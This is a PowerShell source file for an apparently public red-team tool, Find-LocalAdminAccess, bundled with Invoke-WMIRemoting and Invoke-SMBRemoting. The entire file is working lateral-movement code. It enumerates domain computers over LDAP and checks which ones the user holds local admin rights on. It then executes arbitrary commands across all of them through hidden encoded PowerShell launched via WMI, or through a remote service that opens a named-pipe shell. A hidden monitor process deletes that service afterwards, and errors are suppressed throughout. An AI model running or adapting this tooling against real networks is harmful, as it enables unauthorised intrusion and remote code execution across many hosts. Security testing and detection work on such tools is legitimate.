function Find-LocalAdminAccess {
	
	<#

	.SYNOPSIS
	Find-LocalAdminAccess Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Find-LocalAdminAccess
	
	#>
	
    	param (
        	[string]$Targets,
		[Parameter(Mandatory=$true)]
        	[string]$Method,
        	[string]$UserName,
        	[string]$Password,
		[string]$Command,
  		[string]$Domain,
    		[string]$DomainController,
		[switch]$ShowErrors,
		[switch]$scsafe,
		[switch]$NoOutput,
  		[switch]$SaveOutput,
    		[switch]$InLine
    	)
	if(!$ShowErrors){
		$ErrorActionPreference = "SilentlyContinue"
		$WarningPreference = "SilentlyContinue"
	}
	
	Set-Variable MaximumHistoryCount 32767

    	if (($UserName -OR $Password) -AND ($Method -eq "SMB")) {
        	Write-Output "Please use Method WMI or PSRemoting if you need to run as a different user"
        	return
    	}

    	if ($Targets) {
     		$TestPath = Test-Path $Targets
		
		if($TestPath){
			$Computers = Get-Content -Path $Targets
			$Computers = $Computers | Sort-Object -Unique
		}
		
		else{
			$Computers = $Targets
			$Computers = $Computers -split ","
			$Computers = $Computers | Sort-Object -Unique
		}
    	} else {
		$Computers = @()
        	$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
			if($Domain){
				if($DomainController){
					$TempDomainName = "DC=" + $Domain.Split(".")
					$domainDN = $TempDomainName -replace " ", ",DC="
					$ldapPath = "LDAP://$DomainController/$domainDN"
					$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
				}
				else{$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain")}
			}
			else{$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry}
        	$objSearcher.Filter = "(&(sAMAccountType=805306369)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        	$objSearcher.PageSize = 1000
        	$Computers = $objSearcher.FindAll() | ForEach-Object { $_.properties.dnshostname }
		$Computers = $Computers | Sort-Object -Unique
    	}

    	$Computers = $Computers | Where-Object { $_ -and $_.trim() }
	$HostFQDN = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
	$TempHostname = $HostFQDN -replace '\..*', ''
	$Computers = $Computers | Where-Object {$_ -ne "$HostFQDN"}
	$Computers = $Computers | Where-Object {$_ -ne "$TempHostname"}
	
	if($Method -eq "WMI"){$PortScan = 135}
	elseif($Method -eq "SMB"){$PortScan = 445}
	elseif($Method -eq "PSRemoting"){$PortScan = 5985}
	
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	$scriptBlock = {
		param ($computer, $port)
		$tcpClient = New-Object System.Net.Sockets.TcpClient
		$asyncResult = $tcpClient.BeginConnect($computer, $port, $null, $null)
		$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
		if ($wait) {
			try {
				$tcpClient.EndConnect($asyncResult)
				return $computer
			} catch {}
		}
		$tcpClient.Close()
		return $null
	}

	$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'

	foreach ($computer in $Computers) {
		$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer).AddArgument($PortScan)
		$powerShellInstance.RunspacePool = $runspacePool
		$runspaces.Add([PSCustomObject]@{
			Instance = $powerShellInstance
			Status   = $powerShellInstance.BeginInvoke()
		})
	}

	$reachable_hosts = @()
	foreach ($runspace in $runspaces) {
		$result = $runspace.Instance.EndInvoke($runspace.Status)
		if ($result) {
			$reachable_hosts += $result
		}
	}

	$Computers = $reachable_hosts
	
	#$Computers = $Computers | Sort-Object -Unique

	$runspacePool.Close()
	$runspacePool.Dispose()
	
	if($UserName){
		Write-Output ""
		Write-Output "[+] $UserName has Local Admin access on:"
		Write-Output ""
	}
	else{
		Write-Output ""
		Write-Output "[+] The current user has Local Admin access on:"
		Write-Output ""
	}

    	$ScriptBlock = {
		param (
			$Computer,
			$Method,
			$UserName,
			$Password
		)
		
		if($UserName -AND $Password){
			$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
			$cred = New-Object System.Management.Automation.PSCredential($UserName, $SecPassword)
		}
		
		$Error.Clear()

		if ($UserName -AND $Password -AND ($Method -eq "WMI")) {Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue -Credential $cred}
  		elseif ($UserName -AND $Password -AND ($Method -eq "PSRemoting")) {Invoke-Command -ScriptBlock { hostname } -ComputerName $Computer -ErrorAction SilentlyContinue -Credential $cred}
    		elseif ($Method -eq "WMI") {Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue}
      		elseif ($Method -eq "PSRemoting") {Invoke-Command -ScriptBlock { hostname } -ComputerName $Computer -ErrorAction SilentlyContinue}
		elseif ($Method -eq "SMB") {ls \\$Computer\c$ -ErrorAction SilentlyContinue}
		if($error[0] -eq $null) {
			return @{
		    	Computer = $Computer
		    	Success  = $true
			}
	    } else {
			return @{
		    	Computer = $Computer
		    	Success  = $false
		    	Message  = $error[0].ToString()
			}
	    }
	}

    	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
    	$runspacePool.Open()
    	$runspaces = New-Object System.Collections.ArrayList

    	foreach ($Computer in $Computers) {
        	$runspace = [powershell]::Create().AddScript($ScriptBlock).AddArgument($Computer).AddArgument($Method).AddArgument($UserName).AddArgument($Password)
        	$runspace.RunspacePool = $runspacePool
        	$null = $runspaces.Add([PSCustomObject]@{
            		Pipe = $runspace
            		Status = $runspace.BeginInvoke()
        	})
    	}

    	$ComputerAccess = @()
		foreach ($run in $runspaces) {
			try {
				$result = $run.Pipe.EndInvoke($run.Status)
			} catch {}
			if ($result.Success) {
				$ComputerAccess += $result.Computer
			} else {
				Write-Warning "[-] Failed on $($result.Computer): $($result.Message)"
			}
		}

    	$runspaces | ForEach-Object {
        	$_.Pipe.Dispose()
    	}

    	$runspacePool.Close()
    	$runspacePool.Dispose()

 	#$ComputerAccess = $ComputerAccess | Sort-Object -Unique
	
	if($ComputerAccess){
		$ComputerAccess = $ComputerAccess | Where-Object { $_ }
		if($InLine){$LineComputerAccess = $ComputerAccess;$LineComputerAccess = $LineComputerAccess -Join ",";Write-Output $LineComputerAccess}
		else{$ComputerAccess | ForEach-Object { Write-Output $_ }}
	}
  	else{Write-Output "[-] No Access"}
		
	if($SaveOutput){
	    	try {
	        	$ComputerAccess | Out-File $PWD\LocalAdminAccess.txt -Force
	        	Write-Output ""
			Write-Output "[+] Output saved to: $PWD\LocalAdminAccess.txt"
			Write-Output ""
	    	} catch {
	        	$ComputerAccess | Out-File "c:\Users\Public\Documents\LocalAdminAccess.txt" -Force
			Write-Output ""
	        	Write-Output "[+] Output saved to: c:\Users\Public\Documents\LocalAdminAccess.txt"
			Write-Output ""
	    	}
	} else {Write-Output ""}
	
	if ($Command) {

		if ($UserName -and $Password) {
			$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
			$cred = New-Object System.Management.Automation.PSCredential($UserName, $SecPassword)
		}

		if ($Method -eq 'SMB') {
			# Initialize a mutex to synchronize access to sc.exe operations
			if($scsafe){
				$Mutex = [System.Threading.Mutex]::new($false, 'SCMutex')
			}
		}

		# Create and open a runspace pool
		$RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, [System.Environment]::ProcessorCount)
		$RunspacePool.Open()

		$scriptBlock = {
			param($Computer, $Command, $Method, $cred, $Username, $Password, $WmiScript, $SmbScript)

			try {
				if ($Method -eq 'PSRemoting') {
					if ($cred) {
						$command = $command + " | Out-String -Width 4096"
						$output = Invoke-Command -ScriptBlock { Invoke-Expression $Using:Command } -ComputerName $Computer -Credential $cred
					}
					else {
     						$command = $command + " | Out-String -Width 4096"
						$output = Invoke-Command -ScriptBlock { Invoke-Expression $Using:Command } -ComputerName $Computer
					}
				}
				elseif ($Method -eq 'WMI') {
					. ([ScriptBlock]::Create($WmiScript))
					if ($cred) {
						$output = Invoke-WMIRemoting -ComputerName $Computer -Command $Command -Username $Username -Password $Password
					}
					else {
						$output = Invoke-WMIRemoting -ComputerName $Computer -Command $Command
					}
				}
				elseif ($Method -eq 'SMB') {
					. ([ScriptBlock]::Create($SmbScript))
					$output = Invoke-SMBRemoting -ComputerName $Computer -Command $Command
				}

				return @{
					ComputerName = $Computer
					Output       = $output
				}
			} catch {
				return @{
					ComputerName = $Computer
					Error        = $_.Exception.Message
				}
			}
		}

		$JobObjects = @()
		
		if ($Method -eq 'SMB' -AND $scsafe) {
			foreach ($Computer in $ComputerAccess) {
				[void]$Mutex.WaitOne()
				try {
					$Job = [PowerShell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Command).AddArgument($Method).AddArgument($cred).AddArgument($Username).AddArgument($Password).AddArgument($WmiScript).AddArgument($SmbScript)
					$Job.RunspacePool = $RunspacePool
					$JobObjects += @{
						PowerShell = $Job
						Handle     = $Job.BeginInvoke()
					}
				} finally {
					$Mutex.ReleaseMutex()
				}
			}
		}
		
		else{

			foreach ($Computer in $ComputerAccess) {
				$Job = [PowerShell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Command).AddArgument($Method).AddArgument($cred).AddArgument($Username).AddArgument($Password).AddArgument($WmiScript).AddArgument($SmbScript)
				$Job.RunspacePool = $RunspacePool
				$JobObjects += @{
					PowerShell = $Job
					Handle     = $Job.BeginInvoke()
				}
			}
		}

		# Wait for all jobs to complete
		if(!$NoOutput){
			$JobObjects | ForEach-Object { $_.Handle.AsyncWaitHandle.WaitOne() } > $null

			foreach ($Job in $JobObjects) {
				$Result = $Job.PowerShell.EndInvoke($Job.Handle)
				
				if ($Result.Error) {
					Write-Output "$($Result.ComputerName): Error - $($Result.Error)"
				} else {
					Write-Output "[+] $($Result.ComputerName)"
					Write-Output "$($Result.Output.TrimEnd())"
					Write-Output ""
					Write-Output ""
				}
				
				$Job.PowerShell.Dispose()
			}
			
			$RunspacePool.Close()
		}
		
		if ($Method -eq 'SMB' -AND $scsafe) {
			# Release the mutex
			$Mutex.Dispose()
		}
		
		Write-Output "[+] Command execution completed"
		Write-Output ""
	}
}

$WmiScript = @'
function Invoke-WMIRemoting {
	
	<#
	
	.SYNOPSIS
	Invoke-WMIRemoting Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-WMIRemoting
	
	.DESCRIPTION
	Command Execution or Pseudo-Shell over WMI
	The user you run the script as needs to be Administrator over the ComputerName
	
	.PARAMETER ComputerName
	The Server HostName or IP to connect to
	
	.PARAMETER Command
	Specify a command to run instead of entering a Pseudo-Shell
	You'll enter a Pseudo-Shell if -Command is not provided
	
	.PARAMETER UserName
	Specify the UserName to authenticate as
	
	.PARAMETER Password
	Specify a Password for the UserName you want to authenticate as
	
	.EXAMPLE
	Invoke-WMIRemoting -ComputerName Server01.domain.local
	Invoke-WMIRemoting -ComputerName Server01.domain.local -Command "whoami /all"
	Invoke-WMIRemoting -ComputerName Server01.domain.local -Username domain\user -Password Password
	Invoke-WMIRemoting -ComputerName Server01.domain.local -Username domain\user -Password Password -Command "whoami /all"
	
	#>
	
	param (
	[Parameter(Mandatory = $true)]
	[string]$ComputerName,
	[string]$Command,
	[string]$UserName,
	[string]$Password
	)

 	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	
	if($UserName -AND $Password){
		$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
		$cred = New-Object System.Management.Automation.PSCredential($UserName,$SecPassword)
	}

	$ClassID = "Custom_WMI_" + (Get-Random)
	$KeyID = "CmdGUID"
	
	try{	
		if($UserName -AND $Password){$classExists = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred}
	 	else{$classExists = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -List -Namespace "root\cimv2"}
   	} catch {Write-Output "[-] Access Denied"; Write-Output ""; break}

     	try{
		if (-not $classExists) {
			
			if($cred){
				$connectionOptions = New-Object System.Management.ConnectionOptions
				if($UserName -AND $Password){
					$connectionOptions.Username = $UserName
					$connectionOptions.Password = $Password
				}
	
				$scope = New-Object System.Management.ManagementScope("\\$ComputerName\root\cimv2", $connectionOptions)
				$scope.Connect()
				
				$createNewClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]::new(), $null)
				$createNewClass["__CLASS"] = $ClassID
				$createNewClass.Properties.Add($KeyID, [System.Management.CimType]::String, $false)
				$createNewClass.Properties[$KeyID].Qualifiers.Add("Key", $true)
				$createNewClass.Properties.Add("OutputData", [System.Management.CimType]::String, $false)
				$createNewClass.Properties.Add("CommandStatus", [System.Management.CimType]::String, $false)
				$createNewClass.Put() | Out-Null
			}
			else{
				$createNewClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2", [string]::Empty, $null)
				$createNewClass["__CLASS"] = $ClassID
				$createNewClass.Properties.Add($KeyID, [System.Management.CimType]::String, $false)
				$createNewClass.Properties[$KeyID].Qualifiers.Add("Key", $true)
				$createNewClass.Properties.Add("OutputData", [System.Management.CimType]::String, $false)
				$createNewClass.Properties.Add("CommandStatus", [System.Management.CimType]::String, $false)
				$createNewClass.Put() | Out-Null
			}
		}
  	} catch {Write-Output "[-] Access Denied"; Write-Output ""; break}
	
	try{
		if($cred){$wmiData = Set-WmiInstance -Class $ClassID -ComputerName $ComputerName -Credential $cred}
		else{$wmiData = Set-WmiInstance -Class $ClassID -ComputerName $ComputerName}
		
		$wmiData.GetType() | Out-Null
		$GuidOutput = ($wmiData | Select-Object -Property $KeyID -ExpandProperty $KeyID)
		$wmiData.Dispose()
  	} catch {Write-Output "[-] Access Denied"; Write-Output ""; break}


	$RunCmd = {
	        param ([string]$CmdInput)
		$resultData = $null
		$wmiDataOutput = $null
	        $base64Input = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($CmdInput))
	        $commandStr = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $base64Input"
	        $finalCommand = "`$outputData = &$commandStr | Out-String; Get-WmiObject -Class $ClassID -Filter `"$KeyID = '$GuidOutput'`" | Set-WmiInstance -Arguments `@{OutputData = `$outputData; CommandStatus='Completed'} | Out-Null"
	        $finalCommandBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalCommand))
	        if($cred){$startProcess = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -Credential $cred -ArgumentList ("powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $finalCommandBase64)}
		else{$startProcess = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList ("powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $finalCommandBase64)}
	
	        if ($startProcess.ReturnValue -ne 0) {
			throw "Failed to start process on $ComputerName. Return value: $($startProcess.ReturnValue)"
			return
		}
			
		if ($startProcess.ReturnValue -eq 0) {
			$elapsedTime = 0
			$timeout = 60
			do {
				Start-Sleep -Seconds 1
				$elapsedTime++
				if($cred){$wmiDataOutput = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -Credential $cred -Filter "$KeyID = '$GuidOutput'"}
				else{$wmiDataOutput = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -Filter "$KeyID = '$GuidOutput'"}
				if ($wmiDataOutput.CommandStatus -eq "Completed") {
					break
				}
			} while ($elapsedTime -lt $timeout)
			$resultData = $wmiDataOutput.OutputData
			$wmiDataOutput.CommandStatus = "NotStarted"
			$wmiDataOutput.Put() | Out-Null
			$wmiDataOutput.Dispose()
			return $resultData
	        } 
		else {
			throw "Failed to run command on $ComputerName."
			return
	        }
	}

	if ($Command) {
		$finalResult = & $RunCmd -CmdInput $Command
		Write-Output $finalResult
	} 
	else {
	        do {
	            $inputFromUser = Read-Host "[$ComputerName]: PS:\>"
	            if ($inputFromUser -eq 'exit') {
	                Write-Output ""
	                break
	            }
	            if ($inputFromUser) {
	                $finalResult = & $RunCmd -CmdInput $inputFromUser
	                Write-Output $finalResult
	            }
	        } while ($true)
	}
	
	
	if($cred){
		# Create a CimSession with the provided credentials
		if($UserName -AND $Password) {
			$sessionOptions = New-CimSessionOption -Protocol Dcom
			$cimSession = New-CimSession -Credential $cred -ComputerName $ComputerName -SessionOption $sessionOptions
		} 
  		else {$cimSession = New-CimSession -ComputerName $ComputerName}

		# Use the CimSession to delete the class
		$cimInstance = Get-CimInstance -Namespace "ROOT\CIMV2" -ClassName $ClassID -CimSession $cimSession -ErrorAction SilentlyContinue
		if ($cimInstance) {Remove-CimInstance -CimInstance $cimInstance}

		# Optionally, remove the session when done
		$cimSession | Remove-CimSession
	}
	else{([wmiclass]"\\$ComputerName\ROOT\CIMV2:$ClassID").Delete()}
}
'@

$SmbScript = @'
function Invoke-SMBRemoting {
	
	<#

	.SYNOPSIS
	Invoke-SMBRemoting Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-SMBRemoting

	.DESCRIPTION
	Command Execution or Interactive Shell over Named-Pipes
	The user you run the script as needs to be Administrator over the ComputerName
	
	.PARAMETER ComputerName
	The Server HostName or IP to connect to
	
	.PARAMETER PipeName
	Specify the Pipe Name
	
	.PARAMETER ServiceName
	Specify the Service Name
	
	.PARAMETER Command
	Specify a command to run instead of getting a Shell
	
	.PARAMETER Verbose
	Show Pipe and Service Name info
	
	.EXAMPLE
	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local"
	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command whoami
	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all"
 	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService
	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService -Command whoami
	
	#>

	param (
		[string]$PipeName,
		[string]$ComputerName,
		[string]$ServiceName,
		[string]$Command,
		[string]$Timeout = "30000",
		[switch]$Verbose
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	Set-Variable MaximumHistoryCount 32767
	
	if (-not $ComputerName) {
		Write-Output " [-] Please specify a Target"
		return
	}
	
	if(!$PipeName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$PipeName = $randomvalue
	}
	
	if(!$ServiceName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$ServiceName = "Service_" + $randomvalue
	}
	
	$ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
`$pipeServer.WaitForConnection()
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
	if (-not `$pipeServer.IsConnected) {
		break
	}
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break} 
	else {
		try{
			`$result = Invoke-Expression `$command | Out-String
			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} catch {
			`$errorMessage = `$_.Exception.Message
			`$sw.WriteLine(`$errorMessage)
		}
		`$sw.WriteLine("###END###")
		`$sw.Flush()
	}
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
	
	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	
	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
	
	$startarguments = "\\$ComputerName start $ServiceName"
	
	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
	
	Start-Sleep -Milliseconds 1000
	
	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
	if($Verbose){
		Write-Output ""
		Write-Output " [+] Pipe Name: $PipeName"
		Write-Output ""
		Write-Output " [+] Service Name: $ServiceName"
		Write-Output ""
		Write-Output " [+] Creating Service on Remote Target..."
	}
	#Write-Output ""
	
	# Get the current process ID
	$currentPID = $PID
	
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@
	
	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
	# Execute the embedded monitoring script in a hidden window
	Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
	
	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
	
 	try {
		$pipeClient.Connect($Timeout)
	} catch [System.TimeoutException] {
		Write-Output "[$($ComputerName)]: Connection timed out"
		Write-Output ""
		return
	} catch {
		Write-Output "[$($ComputerName)]: An unexpected error occurred"
		Write-Output ""
		return
	}

	$sr = New-Object System.IO.StreamReader($pipeClient)
	$sw = New-Object System.IO.StreamWriter($pipeClient)

	$serverOutput = ""
	
	if ($Command) {
		$fullCommand = "$Command 2>&1 | Out-String"
		$sw.WriteLine($fullCommand)
		$sw.Flush()
		while ($true) {
			$line = $sr.ReadLine()
			if ($line -eq "###END###") {
				Write-Output $serverOutput.Trim()
				Write-Output ""
				return
			} else {
				$serverOutput += "$line`n"
			}
		}
	} 
	
	else {
		while ($true) {
			
			# Fetch the actual remote prompt
			$sw.WriteLine("prompt | Out-String")
			$sw.Flush()
			
			$remotePath = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "###END###") {
					# Remove any extraneous whitespace, newlines etc.
					$remotePath = $remotePath.Trim()
					break
				} else {
					$remotePath += "$line`n"
				}
			}
			
			$computerNameOnly = $ComputerName -split '\.' | Select-Object -First 1
			$promptString = "[$computerNameOnly]: $remotePath "
			Write-Host -NoNewline $promptString
			$userCommand = Read-Host
			
			if ($userCommand -eq "exit") {
				Write-Output ""
					$sw.WriteLine("exit")
				$sw.Flush()
				break
			}
			
			elseif($userCommand -ne ""){
				$fullCommand = "$userCommand 2>&1 | Out-String"
				$sw.WriteLine($fullCommand)
				$sw.Flush()
			}
			
			else{
				continue
			}
			
			#Write-Output ""

			$serverOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "###END###") {
					Write-Output $serverOutput.Trim()
					Write-Output ""
					break
				} else {
					$serverOutput += "$line`n"
				}
			}
		}
	}

	$stoparguments = "\\$ComputerName delete $ServiceName"
	Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
	$pipeClient.Close()
	$pipeClient.Dispose()
}
'@
